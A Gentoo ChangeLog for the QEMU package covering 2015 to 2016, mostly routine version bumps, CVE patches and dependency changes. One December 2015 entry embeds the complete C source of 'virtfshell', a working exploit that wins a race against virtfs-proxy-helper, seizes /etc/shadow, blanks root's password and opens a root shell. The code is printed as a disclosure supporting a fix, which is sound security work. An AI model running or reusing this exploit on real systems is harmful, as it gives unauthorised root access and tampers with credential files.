@@ -1,0 +1,792 @@
+# ChangeLog for app-emulation/qemu
+# Copyright 1999-2016 Gentoo Foundation; Distributed under the GPL v2
+# (auto-generated from git log)
+
+*qemu-9999 (09 Aug 2015)
+*qemu-2.3.0-r5 (09 Aug 2015)
+*qemu-2.3.0-r4 (09 Aug 2015)
+
+  09 Aug 2015; Robin H. Johnson <robbat2@gentoo.org> +files/65-kvm.rules,
+  +files/bridge.conf, +files/qemu-1.7.0-cflags.patch,
+  +files/qemu-2.2.1-CVE-2015-1779-1.patch,
+  +files/qemu-2.2.1-CVE-2015-1779-2.patch,
+  +files/qemu-2.3.0-CVE-2015-3209.patch,
+  +files/qemu-2.3.0-CVE-2015-3214.patch,
+  +files/qemu-2.3.0-CVE-2015-3456.patch,
+  +files/qemu-2.3.0-CVE-2015-5154-1.patch,
+  +files/qemu-2.3.0-CVE-2015-5154-2.patch,
+  +files/qemu-2.3.0-CVE-2015-5154-3.patch,
+  +files/qemu-2.3.0-CVE-2015-5158.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-1.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-2.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-3.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-4.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-5.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-6.patch,
+  +files/qemu-2.3.0-CVE-2015-5165-7.patch,
+  +files/qemu-2.3.0-CVE-2015-5166.patch, +files/qemu-binfmt.initd-r1,
+  +metadata.xml, +qemu-2.3.0-r4.ebuild, +qemu-2.3.0-r5.ebuild,
+  +qemu-9999.ebuild:
+  proj/gentoo: Initial commit
+
+  This commit represents a new era for Gentoo:
+  Storing the gentoo-x86 tree in Git, as converted from CVS.
+
+  This commit is the start of the NEW history.
+  Any historical data is intended to be grafted onto this point.
+
+  Creation process:
+  1. Take final CVS checkout snapshot
+  2. Remove ALL ChangeLog* files
+  3. Transform all Manifests to thin
+  4. Remove empty Manifests
+  5. Convert all stale $Header$/$Id$ CVS keywords to non-expanded Git $Id$
+  5.1. Do not touch files with -kb/-ko keyword flags.
+
+  Signed-off-by: Robin H. Johnson <robbat2@gentoo.org>
+  X-Thanks: Alec Warner <antarus@gentoo.org> - did the GSoC 2006 migration
+  tests
+  X-Thanks: Robin H. Johnson <robbat2@gentoo.org> - infra guy, herding this
+  project
+  X-Thanks: Nguyen Thai Ngoc Duy <pclouds@gentoo.org> - Former Gentoo
+  developer, wrote Git features for the migration
+  X-Thanks: Brian Harring <ferringb@gentoo.org> - wrote much python to improve
+  cvs2svn
+  X-Thanks: Rich Freeman <rich0@gentoo.org> - validation scripts
+  X-Thanks: Patrick Lauer <patrick@gentoo.org> - Gentoo dev, running new 2014
+  work in migration
+  X-Thanks: Michał Górny <mgorny@gentoo.org> - scripts, QA, nagging
+  X-Thanks: All of other Gentoo developers - many ideas and lots of paint on
+  the bikeshed
+
+*qemu-2.3.0-r6 (10 Aug 2015)
+
+  10 Aug 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.3.0-virtio-serial.patch, +qemu-2.3.0-r6.ebuild:
+  qemu: fix from upstream for virtio-serial security issue #557206
+
+  10 Aug 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.3.0-r6.ebuild:
+  qemu: do not put directly into stable
+
+*qemu-2.3.1 (12 Aug 2015)
+
+  12 Aug 2015; Mike Frysinger <vapier@gentoo.org> +qemu-2.3.1.ebuild:
+  qemu: version bump to 2.3.1
+
+*qemu-2.4.0 (12 Aug 2015)
+
+  12 Aug 2015; Mike Frysinger <vapier@gentoo.org> +qemu-2.4.0.ebuild:
+  qemu: version bump to 2.4.0
+
+  14 Aug 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.4.0.ebuild,
+  qemu-9999.ebuild:
+  depend on libepoxy for USE=opengl #557488
+
+  14 Aug 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.4.0.ebuild,
+  qemu-9999.ebuild:
+  move more deps to softmmu-only case
+
+  These packages are only used when building softmmu binaries, so don't try
+  pulling them in when the user is building tools or user binaries.
+
+  14 Aug 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.3.0-r4.ebuild,
+  qemu-2.3.0-r5.ebuild, qemu-2.3.0-r6.ebuild, qemu-2.3.1.ebuild,
+  qemu-2.4.0.ebuild, qemu-9999.ebuild:
+  switch to virtual/libusb to quiet repoman
+
+  Now that the virtual requires the latest libusb, we can switch to that
+  rather than depending directly on libusb's version.
+
+  16 Aug 2015; Justin Lecher <jlec@gentoo.org> metadata.xml,
+  qemu-2.3.0-r4.ebuild, qemu-2.3.0-r5.ebuild, qemu-2.3.0-r6.ebuild,
+  qemu-2.3.1.ebuild, qemu-2.4.0.ebuild, qemu-9999.ebuild:
+  Use slot operators for ncurses
+
+  Package-Manager: portage-2.2.20.1
+  Signed-off-by: Justin Lecher <jlec@gentoo.org>
+
+  24 Aug 2015; Justin Lecher <jlec@gentoo.org> metadata.xml,
+  qemu-2.3.0-r4.ebuild, qemu-2.3.0-r5.ebuild, qemu-2.3.0-r6.ebuild,
+  qemu-2.3.1.ebuild, qemu-2.4.0.ebuild, qemu-9999.ebuild:
+  Use https by default
+
+  Convert all URLs for sites supporting encrypted connections from http to
+  https
+
+  Signed-off-by: Justin Lecher <jlec@gentoo.org>
+
+  24 Aug 2015; Mike Gilbert <floppym@gentoo.org> metadata.xml:
+  Revert DOCTYPE SYSTEM https changes in metadata.xml
+
+  repoman does not yet accept the https version.
+  This partially reverts eaaface92ee81f30a6ac66fe7acbcc42c00dc450.
+
+  Bug: https://bugs.gentoo.org/552720
+
+  26 Aug 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.3.0-r4.ebuild,
+  qemu-2.3.0-r5.ebuild, qemu-2.3.0-r6.ebuild, qemu-2.3.1.ebuild,
+  qemu-2.4.0.ebuild, qemu-9999.ebuild:
+  sys-libs/ncurses: move to SLOT=0 #557472
+
+  Use SLOT=0 for installing of main development files like other packages
+  so we can use other SLOTs for installing SONAME libs for binary packages.
+
+  28 Aug 2015; Manuel Rüger <mrueg@gentoo.org> -qemu-2.3.0-r4.ebuild:
+  Remove vulnerable
+
+  Package-Manager: portage-2.2.20.1
+
+  07 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  add new targets
+
+  07 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  update seabios pin to version 1.8.2
+
+  07 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  add target sanity checks
+
+  This way we know up front when a new target appears rather than when
+  someone happens to check & notice.
+
+*qemu-2.4.0-r1 (07 Sep 2015)
+
+  07 Sep 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.4.0-CVE-2015-5225.patch,
+  +files/qemu-2.4.0-block-mirror-crash.patch,
+  +files/qemu-2.4.0-e1000-loop.patch, -qemu-2.4.0.ebuild,
+  +qemu-2.4.0-r1.ebuild:
+  various fixes/updates
+
+  Sync in the updates from the 9999 ebuild:
+   - updated seabios pin
+   - add new targets
+   - add sanity checks for targets
+
+  Add fix from upstream for blockcommit crashes #558396.
+
+  Add fix from upstream for CVE-2015-5225 #558416.
+
+  Add fix posted upstream (but not yet merged) for e1000 infinite loop
+  #559656.
+
+  08 Sep 2015; Agostino Sarubbo <ago@gentoo.org> qemu-2.4.0-r1.ebuild:
+  amd64 stable wrt bug #558416
+
+  Package-Manager: portage-2.2.20.1
+  RepoMan-Options: --include-arches="amd64"
+
+  08 Sep 2015; Agostino Sarubbo <ago@gentoo.org> qemu-2.4.0-r1.ebuild:
+  x86 stable wrt bug #558416
+
+  Package-Manager: portage-2.2.20.1
+  RepoMan-Options: --include-arches="x86"
+
+  11 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.4.0-r1.ebuild,
+  qemu-9999.ebuild:
+  require mesa[egl] too
+
+  Upstream commit 7ced9e9f6da2257224591b91727cfeee4f3977fb made the egl
+  layer of mesa a requirement.
+
+  16 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  switch USE=tls to USE=gnutls #560574
+
+  Upstream no longer has dedicated configuration options for tls settings.
+  Instead, it's all run through the gnutls feature test.
+
+  We require newer versions of gnutls because supporting older ones gets a
+  bit messy -- qemu might leverage libgcrypt or nettle depending on how the
+  gnutls package was built.  By forcing the latest version, we can simplify
+  and only require nettle.  This isn't a big deal as it's already stable.
+
+  26 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  add tilegx linux-user target #561322
+
+  29 Sep 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  update smartcard configure flag #561670
+
+*qemu-2.4.0.1 (10 Oct 2015)
+
+  10 Oct 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.4.0-CVE-2015-6855.patch,
+  +files/qemu-2.4.0-CVE-2015-7295-1.patch,
+  +files/qemu-2.4.0-CVE-2015-7295-2.patch,
+  +files/qemu-2.4.0-CVE-2015-7295-3.patch, +qemu-2.4.0.1.ebuild:
+  version bump to 2.4.0.1 #562594
+
+  This also includes security fixes for #560760 #560550 #560422.
+
+*qemu-2.4.0.1-r1 (15 Oct 2015)
+
+  15 Oct 2015; Markos Chandras <hwoarang@gentoo.org>
+  +files/qemu-2.4-mips-fix-mtc0.patch, +files/qemu-2.4-mips-fix-rdhwr.patch,
+  +files/qemu-2.4-mips-move-interrupts-new-func.patch,
+  +files/qemu-2.4-mips-wake-up-on-irq.patch, +qemu-2.4.0.1-r1.ebuild:
+  Backport a few MIPS patches. Bug #563162
+
+  Package-Manager: portage-2.2.23
+
+  26 Oct 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  update qmp doc paths #564186
+
+*qemu-2.4.1 (06 Nov 2015)
+
+  06 Nov 2015; Mike Frysinger <vapier@gentoo.org> +qemu-2.4.1.ebuild:
+  version bump to 2.4.1 #564990
+
+  07 Nov 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.4.0-r1.ebuild,
+  qemu-2.4.0.1.ebuild, qemu-2.4.0.1-r1.ebuild, qemu-2.4.1.ebuild,
+  qemu-9999.ebuild:
+  force C locale for sorting to workaround glibc bug #564936
+
+  23 Nov 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.0-cflags.patch, qemu-9999.ebuild:
+  update cflags patch #565866
+
+  07 Dec 2015; Doug Goldstein <cardoe@gentoo.org> qemu-2.3.0-r5.ebuild,
+  qemu-2.3.0-r6.ebuild, qemu-2.3.1.ebuild, qemu-2.4.0-r1.ebuild,
+  qemu-2.4.0.1.ebuild, qemu-2.4.0.1-r1.ebuild, qemu-2.4.1.ebuild,
+  qemu-9999.ebuild:
+  utilize xen-tools sub-slot
+
+  app-emulation/xen-tools now exposes a sub-slot to help dependencies
+  rebuild when necessary.
+
+  Signed-off-by: Doug Goldstein <cardoe@gentoo.org>
+
+*qemu-2.4.1-r1 (08 Dec 2015)
+
+  08 Dec 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.4.1-CVE-2015-7504.patch,
+  +files/qemu-2.4.1-CVE-2015-7512.patch,
+  +files/qemu-2.4.1-CVE-2015-8345.patch, +qemu-2.4.1-r1.ebuild:
+  add upstream security fixes #566792 #567144
+
+  08 Dec 2015; Mike Frysinger <vapier@gentoo.org> metadata.xml,
+  qemu-9999.ebuild:
+  add USE=virgl for Virgil 3d GPU #566994
+
+  08 Dec 2015; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  switch to new libcacard release #561814
+
+*qemu-2.4.0.1-r2 (14 Dec 2015)
+*qemu-2.4.0-r2 (14 Dec 2015)
+*qemu-2.3.1-r1 (14 Dec 2015)
+*qemu-2.3.0-r7 (14 Dec 2015)
+
+  14 Dec 2015; Jason A. Donenfeld <zx2c4@gentoo.org> +qemu-2.3.0-r7.ebuild,
+  +qemu-2.3.1-r1.ebuild, +qemu-2.4.0-r2.ebuild, +qemu-2.4.0.1-r2.ebuild:
+  critical security fix
+
+  The virtfs-proxy-helper program is not a safe binary to give caps.
+  The following exploit code demonstrates the vulnerability:
+
+  ~=~=~=~= snip ~=~=~=~=
+
+  /* == virtfshell ==
+   *
+   * Some distributions make virtfs-proxy-helper from QEMU either SUID or
+   * give it CAP_CHOWN fs capabilities. This is a terrible idea. While
+   * virtfs-proxy-helper makes some sort of flimsy check to make sure
+   * its socket path doesn't already exist, it is vulnerable to TOCTOU.
+   *
+   * This should spawn a root shell eventually on vulnerable systems.
+   *
+   * - zx2c4
+   * 2015-12-12
+   *
+   *
+   * zx2c4@thinkpad ~ $ lsb_release -i
+   * Distributor ID: Gentoo
+   * zx2c4@thinkpad ~ $ ./virtfshell
+   * == Virtfshell - by zx2c4 ==
+   * [+] Beginning race loop
+   * [+] Chown'd /etc/shadow, elevating to root
+   * [+] Cleaning up
+   * [+] Spawning root shell
+   * thinkpad zx2c4 # whoami
+   * root
+   *
+   */
+
+   #include <stdio.h>
+   #include <sys/wait.h>
+   #include <sys/stat.h>
+   #include <sys/types.h>
+   #include <sys/inotify.h>
+   #include <unistd.h>
+   #include <stdlib.h>
+   #include <signal.h>
+
+  static int it_worked(void)
+  {
+          struct stat sbuf = { 0 };
+          stat("/etc/shadow", &sbuf);
+          return sbuf.st_uid == getuid() && sbuf.st_gid == getgid();
+  }
+
+  int main(int argc, char **argv)
+  {
+          int fd;
+          pid_t pid;
+          char uid[12], gid[12];
+
+          sprintf(uid, "%d", getuid());
+          sprintf(gid, "%d", getgid());
+
+          printf("== Virtfshell - by zx2c4 ==\n");
+
+          printf("[+] Beginning race loop\n");
+
+          while (!it_worked()) {
+                  fd = inotify_init();
+                  unlink("/tmp/virtfshell/sock");
+                  mkdir("/tmp/virtfshell", 0777);
+                  inotify_add_watch(fd, "/tmp/virtfshell", IN_CREATE);
+                  pid = fork();
+                  if (!pid) {
+                          close(0);
+                          close(1);
+                          close(2);
+                          execlp("virtfs-proxy-helper", "virtfs-proxy-helper",
+  "-n", "-p", "/tmp", "-u", uid, "-g", gid, "-s", "/tmp/virtfshell/sock",
+  NULL);
+                          _exit(1);
+                  }
+                  read(fd, 0, 0);
+                  unlink("/tmp/virtfshell/sock");
+                  symlink("/etc/shadow", "/tmp/virtfshell/sock");
+                  close(fd);
+                  kill(pid, SIGKILL);
+                  wait(NULL);
+          }
+
+          printf("[+] Chown'd /etc/shadow, elevating to root\n");
+
+          system( "cp /etc/shadow /tmp/original_shadow;"
+                  "sed 's/^root:.*/root::::::::/' /etc/shadow >
+  /tmp/modified_shadow;"
+                  "cat /tmp/modified_shadow > /etc/shadow;"
+                  "su -c '"
+                  "       echo [+] Cleaning up;"
+                  "       cat /tmp/original_shadow > /etc/shadow;"
+                  "       chown root:root /etc/shadow;"
+                  "       rm /tmp/modified_shadow /tmp/original_shadow;"
+                  "       echo [+] Spawning root shell;"
+                  "       exec /bin/bash -i"
+                  "'");
+          return 0;
+  }
+
+  15 Dec 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.3.0-r5.ebuild,
+  qemu-2.3.0-r6.ebuild, qemu-2.3.1.ebuild, qemu-2.4.0-r1.ebuild,
+  qemu-2.4.0.1.ebuild, qemu-2.4.0.1-r1.ebuild, qemu-2.4.1.ebuild,
+  qemu-2.4.1-r1.ebuild, qemu-9999.ebuild:
+  drop virtfs-proxy-helper fcaps from all versions #568226
+
+*qemu-2.4.1-r2 (15 Dec 2015)
+
+  15 Dec 2015; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.4.1-CVE-2015-7549.patch,
+  +files/qemu-2.4.1-CVE-2015-8504.patch, +qemu-2.4.1-r2.ebuild:
+  add upstream fixes for #567828 #568214
+
+  16 Dec 2015; Agostino Sarubbo <ago@gentoo.org> qemu-2.4.1-r2.ebuild:
+  amd64 stable wrt bug #567828
+
+  Package-Manager: portage-2.2.24
+  RepoMan-Options: --include-arches="amd64"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  16 Dec 2015; Agostino Sarubbo <ago@gentoo.org> qemu-2.4.1-r2.ebuild:
+  x86 stable wrt bug #567828
+
+  Package-Manager: portage-2.2.24
+  RepoMan-Options: --include-arches="x86"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+*qemu-2.5.0 (17 Dec 2015)
+
+  17 Dec 2015; Mike Frysinger <vapier@gentoo.org> +qemu-2.5.0.ebuild:
+  version bump to 2.5.0
+
+  17 Dec 2015; Mike Frysinger <vapier@gentoo.org>
+  -files/qemu-2.2.1-CVE-2015-1779-1.patch,
+  -files/qemu-2.2.1-CVE-2015-1779-2.patch,
+  -files/qemu-2.3.0-CVE-2015-3209.patch,
+  -files/qemu-2.3.0-CVE-2015-3214.patch,
+  -files/qemu-2.3.0-CVE-2015-3456.patch,
+  -files/qemu-2.3.0-CVE-2015-5154-1.patch,
+  -files/qemu-2.3.0-CVE-2015-5154-2.patch,
+  -files/qemu-2.3.0-CVE-2015-5154-3.patch,
+  -files/qemu-2.3.0-CVE-2015-5158.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-1.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-2.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-3.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-4.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-5.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-6.patch,
+  -files/qemu-2.3.0-CVE-2015-5165-7.patch,
+  -files/qemu-2.3.0-CVE-2015-5166.patch,
+  -files/qemu-2.3.0-virtio-serial.patch,
+  -files/qemu-2.4.0-CVE-2015-5225.patch,
+  -files/qemu-2.4.0-CVE-2015-6855.patch,
+  -files/qemu-2.4.0-CVE-2015-7295-1.patch,
+  -files/qemu-2.4.0-CVE-2015-7295-2.patch,
+  -files/qemu-2.4.0-CVE-2015-7295-3.patch,
+  -files/qemu-2.4.0-block-mirror-crash.patch,
+  -files/qemu-2.4.0-e1000-loop.patch, -qemu-2.3.0-r5.ebuild,
+  -qemu-2.3.0-r6.ebuild, -qemu-2.3.0-r7.ebuild, -qemu-2.3.1.ebuild,
+  -qemu-2.3.1-r1.ebuild, -qemu-2.4.0-r1.ebuild, -qemu-2.4.0-r2.ebuild,
+  -qemu-2.4.0.1.ebuild, -qemu-2.4.0.1-r1.ebuild, -qemu-2.4.0.1-r2.ebuild,
+  -qemu-2.4.1.ebuild, -qemu-2.4.1-r1.ebuild:
+  drop versions <2.4.1-r2
+
+  20 Dec 2015; Mike Frysinger <vapier@gentoo.org> qemu-2.5.0.ebuild,
+  qemu-9999.ebuild:
+  disable libgcrypt usage #568856
+
+*qemu-2.5.0-r1 (18 Jan 2016)
+
+  18 Jan 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.0-CVE-2015-8558.patch,
+  +files/qemu-2.5.0-CVE-2015-8567.patch,
+  +files/qemu-2.5.0-CVE-2015-8701.patch,
+  +files/qemu-2.5.0-CVE-2015-8743.patch,
+  +files/qemu-2.5.0-CVE-2016-1568.patch, +qemu-2.5.0-r1.ebuild:
+  add upstream fixes for #567868 #568246 #570110 #570988 #571566
+
+  24 Jan 2016; Michał Górny <mgorny@gentoo.org> metadata.xml:
+  Replace all herds with appropriate projects (GLEP 67)
+
+  Replace all uses of herd with appropriate project maintainers, or no
+  maintainers in case of herds requested to be disbanded.
+
+  24 Jan 2016; Michał Górny <mgorny@gentoo.org> metadata.xml:
+  Set appropriate maintainer types in metadata.xml (GLEP 67)
+
+  26 Jan 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r1.ebuild:
+  amd64 stable wrt bug #571566
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="amd64"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  26 Jan 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r1.ebuild:
+  x86 stable wrt bug #571566
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="x86"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  15 Feb 2016; Doug Goldstein <cardoe@gentoo.org>
+  -files/qemu-1.7.0-cflags.patch, -files/qemu-2.4-mips-fix-mtc0.patch,
+  -files/qemu-2.4-mips-fix-rdhwr.patch,
+  -files/qemu-2.4-mips-move-interrupts-new-func.patch,
+  -files/qemu-2.4-mips-wake-up-on-irq.patch,
+  -files/qemu-2.4.1-CVE-2015-7504.patch,
+  -files/qemu-2.4.1-CVE-2015-7512.patch,
+  -files/qemu-2.4.1-CVE-2015-7549.patch,
+  -files/qemu-2.4.1-CVE-2015-8345.patch,
+  -files/qemu-2.4.1-CVE-2015-8504.patch, -qemu-2.4.1-r2.ebuild,
+  -qemu-2.5.0.ebuild:
+  remove vulnerable versions
+
+  Package-Manager: portage-2.2.26
+  Signed-off-by: Doug Goldstein <cardoe@gentoo.org>
+
+  15 Feb 2016; Patrick Lauer <patrick@gentoo.org> metadata.xml:
+  Remove unneeded useflag description from metadata.xml
+
+  Package-Manager: portage-2.2.27
+
+  19 Feb 2016; Robin H. Johnson <robbat2@gentoo.org> metadata.xml:
+  restore USE=gnutls use desc for side-effects
+
+  commit ea4d1e1fcc just removed the USE=tls, rather than updating it for
+  USE=gnutls. Per the description, it has side-effects of enabling
+  enabling WebSocket & disk quorum features.
+
+  Package-Manager: portage-2.2.27
+
+  28 Feb 2016; Doug Goldstein <cardoe@gentoo.org> qemu-2.5.0-r1.ebuild:
+  fix arm64 dependencies
+
+  arm/arm64 have some dependencies which are higher than other platforms.
+  Unfortunately the dependencies are not stable on arm but this package is
+  so arm updates will come later.
+
+  Package-Manager: portage-2.2.26
+  Signed-off-by: Doug Goldstein <cardoe@gentoo.org>
+
+  28 Feb 2016; Matthew Thode <prometheanfire@gentoo.org> qemu-2.5.0-r1.ebuild:
+  keywording arm64
+
+  merged on X-C1
+
+  Package-Manager: portage-2.2.26
+
+  15 Mar 2016; Doug Goldstein <cardoe@gentoo.org> qemu-2.5.0-r1.ebuild:
+  fix arm depends for libseccomp
+
+  arm needs libseccomp 2.2.3 or newer for QEMU to be able to utilize it.
+
+  Package-Manager: portage-2.2.26
+  Signed-off-by: Doug Goldstein <cardoe@gentoo.org>
+
+*qemu-2.5.0-r2 (23 Mar 2016)
+
+  23 Mar 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.0-CVE-2015-8613.patch,
+  +files/qemu-2.5.0-CVE-2015-8619.patch,
+  +files/qemu-2.5.0-CVE-2016-1714.patch,
+  +files/qemu-2.5.0-CVE-2016-1922.patch,
+  +files/qemu-2.5.0-CVE-2016-1981.patch,
+  +files/qemu-2.5.0-CVE-2016-2197.patch,
+  +files/qemu-2.5.0-CVE-2016-2198.patch,
+  +files/qemu-2.5.0-CVE-2016-2392.patch,
+  +files/qemu-2.5.0-rng-stack-corrupt-0.patch,
+  +files/qemu-2.5.0-rng-stack-corrupt-1.patch,
+  +files/qemu-2.5.0-rng-stack-corrupt-2.patch,
+  +files/qemu-2.5.0-rng-stack-corrupt-3.patch,
+  +files/qemu-2.5.0-sysmacros.patch, +files/qemu-2.5.0-usb-ehci-oob.patch,
+  +files/qemu-2.5.0-usb-ndis-int-overflow.patch, +qemu-2.5.0-r2.ebuild:
+  backport various upstream fixes
+
+  24 Mar 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r2.ebuild:
+  amd64 stable wrt bug #578044
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="amd64"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  24 Mar 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r2.ebuild:
+  x86 stable wrt bug #578044
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="x86"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  25 Mar 2016; Sergey Popov <pinkbyte@gentoo.org> -qemu-2.5.0-r1.ebuild:
+  security cleanup
+
+  Gentoo-Bug: 576420
+
+  Package-Manager: portage-2.2.28
+
+  28 Mar 2016; Mike Frysinger <vapier@gentoo.org> qemu-2.5.0-r2.ebuild,
+  qemu-9999.ebuild:
+  use l10n.eclass to respect LINGUAS #577814
+
+*qemu-2.5.0-r3 (28 Mar 2016)
+
+  28 Mar 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.0-9pfs-segfault.patch,
+  +files/qemu-2.5.0-ne2000-reg-check.patch, +qemu-2.5.0-r3.ebuild:
+  add few more upstream fixes #573816 #578142
+
+  29 Mar 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r3.ebuild:
+  amd64 stable wrt bug #573816
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="amd64"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  29 Mar 2016; Agostino Sarubbo <ago@gentoo.org> qemu-2.5.0-r3.ebuild:
+  x86 stable wrt bug #573816
+
+  Package-Manager: portage-2.2.26
+  RepoMan-Options: --include-arches="x86"
+  Signed-off-by: Agostino Sarubbo <ago@gentoo.org>
+
+  20 Apr 2016; Mike Frysinger <vapier@gentoo.org> qemu-2.5.0-r3.ebuild,
+  qemu-9999.ebuild:
+  mention /dev/kvm perm updates in the readme/elog #580436
+
+*qemu-2.5.1 (23 Apr 2016)
+
+  23 Apr 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.1-CVE-2015-8558.patch,
+  +files/qemu-2.5.1-CVE-2016-4020.patch,
+  +files/qemu-2.5.1-stellaris_enet-overflow.patch, +qemu-2.5.1.ebuild:
+  app-misc/qemu: version bump & bug fixes #579614 #580040 #580426
+
+  12 May 2016; Mike Frysinger <vapier@gentoo.org> qemu-2.5.1.ebuild,
+  qemu-9999.ebuild:
+  use subslots w/nettle & gnutls #582836
+
+*qemu-2.6.0 (17 May 2016)
+
+  17 May 2016; Mike Frysinger <vapier@gentoo.org> +qemu-2.6.0.ebuild,
+  qemu-9999.ebuild:
+  version bump to 2.6.0 #583212
+
+  17 May 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.5.1-xfs-linux-headers.patch, qemu-2.5.1.ebuild:
+  workaround breakage in xfs/linux headers #577810
+
+  Add upstream patch to workaround some combinations of xfsprogs & linux
+  headers so we don't have to worry about stable breakage anymore.  This
+  fix is already in upstream & unstable versions.
+
+  18 May 2016; Austin English <wizardedit@gentoo.org>
+  files/qemu-binfmt.initd-r1:
+  use #!/sbin/openrc-run instead of #!/sbin/runscript
+
+  06 Jun 2016; Mike Frysinger <vapier@gentoo.org> qemu-2.5.0-r2.ebuild,
+  qemu-2.5.0-r3.ebuild, qemu-2.5.1.ebuild, qemu-2.6.0.ebuild,
+  qemu-9999.ebuild:
+  depend on jpeg SLOT=0 for building
+
+  07 Jun 2016; Mike Frysinger <vapier@gentoo.org>
+  +files/qemu-2.6.0-crypto-static.patch, qemu-2.6.0.ebuild, qemu-9999.ebuild:
+  fix static linking errors w/curl[ssl,curl_ssl_openssl]
+
+  21 Jun 2016; Mike Frysinger <vapier@gentoo.org> qemu-9999.ebuild:
+  drop kvm_stat to match upstream #586158
+
+  29 Jun 2016; Alexey Shvetsov <alexxy@gentoo.org> qemu-2.5.0-r2.ebuild,
+  qemu-2.5.0-r3.ebuild, qemu-2.5.1.ebuild, qemu-2.6.0.ebuild,
+  qemu-9999.ebuild:
+  adapt sys-infiniband to sys-fabric rename
+
+  Package-Manager: portage-2.3.0_rc1
+
+  01 Aug 2016; Mike Frysinger <vapier@gentoo.org> qemu-2.5.1.ebuild,
+  qemu-2.6.0.ebuild, qemu-9999.ebuild:
+  handle bzip2 dep #589968
+
+  The block layer uses it to support bzip2 compression in dmg images.
+  That code makes it into softmmu binaries and userland utils.
+
+  07 Aug 2016; Luca Barbato <lu_zero@gentoo.org>
+  +files/qemu-2.6.0-glib-size_t.patch, qemu-2.6.0.ebuild:
+  Drop a -Werror when it could cause a false positive
+
+  The check code could trigger recent compiler warnings.
+
+  Package-Manager: portage-2.2.26
+
+  15 Aug 2016; Luca Barbato <lu_zero@gentoo.org> files/qemu-binfmt.initd-r1:
+  Update ppc magic mask
+
+  Unbreak using qemu-user with current stage3.
+
+  Package-Manager: portage-2.3.0
+
+  21 Aug 2016; Luca Barbato <lu_zero@gentoo.org> qemu-9999.ebuild:
+  Update the languages list
+
+  Package-Manager: portage-2.3.0
+
+  21 Aug 2016; Luca Barbato <lu_zero@gentoo.org> qemu-9999.ebuild:
+  Drop a patch
+
+  It is already upstreamed.
+
+  Package-Manager: portage-2.3.0
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org> -qemu-2.5.0-r2.ebuild,
+  -qemu-2.5.0-r3.ebuild:
+  remove vulnerable 2.5.0
+
+  Package-Manager: portage-2.2.28
+
+*qemu-2.7.0 (05 Sep 2016)
+
+  05 Sep 2016; Matthias Maier <tamiko@gentoo.org> +qemu-2.7.0.ebuild:
+  version bump to 2.7.0, various security fixes
+
+  3af9187fc6caaf415ab9c0c6d92c9678f65cb17f -> CVE-2016-4001, bug #579734
+  3a15cc0e1ee7168db0782133d2607a6bfa422d66 -> CVE-2016-4002, bug #579734
+  c98c6c105f66f05aa0b7c1d2a4a3f716450907ef -> CVE-2016-4439, bug #583496
+  6c1fef6b59563cc415f21e03f81539ed4b33ad90 -> CVE-2016-4441, bug #583496
+  06630554ccbdd25780aa03c3548aaff1eb56dffd ->              , bug #583952
+  844864fbae66935951529408831c2f22367a57b6 -> CVE-2016-5337, bug #584094
